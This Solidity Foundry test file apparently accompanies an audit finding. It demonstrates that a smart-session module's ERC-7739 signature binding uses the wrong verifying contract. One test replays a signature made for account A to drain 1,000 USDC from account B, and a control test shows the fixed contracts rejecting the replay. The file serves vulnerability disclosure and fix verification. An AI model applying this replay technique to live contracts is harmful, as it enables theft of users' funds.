// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    AccountFixed,
    Exploit,
    SmartSession,
    SmartSessionFixed,
    Usdc
} from "./42064-erc-7739-does-not-use-correct-verifyingcontract-address-cant.sol";

contract Finding42064Test is Test {
    uint256 internal constant PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    function _sign(Exploit e) internal returns (bytes memory sig) {
        bytes32 digest = e.session().transferDigest(e.RECIPIENT(), e.AMOUNT());
        bytes32 pureDigest = e.session().digestFor(address(e.session()), e.RECIPIENT(), e.AMOUNT());
        assertEq(digest, pureDigest, "assembly hash matches domainFor(module)");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PK, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_exploit_signature_for_a_pays_from_b() public {
        Exploit e = new Exploit();
        bytes memory sig = _sign(e);
        e.setReplaySig(sig);
        e.run();

        assertEq(e.token().balanceOf(e.RECIPIENT()), 1_000_000_000, "recipient got 1000");
        assertEq(e.token().balanceOf(address(e.accountA())), 1_000_000_000, "A untouched");
        assertEq(e.token().balanceOf(address(e.accountB())), 0, "B drained");
        emit log_named_uint("usdc_from_b", e.token().balanceOf(e.RECIPIENT()));
        emit log_named_uint("left_on_a", e.token().balanceOf(address(e.accountA())));
    }

    function test_control_binds_verifying_contract_to_the_account() public {
        Exploit e = new Exploit();
        bytes memory sig = _sign(e);

        Usdc token = new Usdc();
        SmartSessionFixed fixedSession = new SmartSessionFixed();
        AccountFixed b = new AccountFixed(fixedSession, token);
        token.mint(address(b), 1_000_000_000);

        assertFalse(fixedSession.accept(address(b), e.RECIPIENT(), 1_000_000_000, sig), "fixed accept");
        (bool okCall,) = address(b).call(
            abi.encodeWithSelector(AccountFixed.execute.selector, e.RECIPIENT(), uint256(1_000_000_000), sig)
        );
        assertFalse(okCall, "replay did not revert");

        assertEq(token.balanceOf(e.RECIPIENT()), 0, "replay paid nothing");
        assertEq(token.balanceOf(address(b)), 1_000_000_000, "fixed account kept 1000");
    }
}
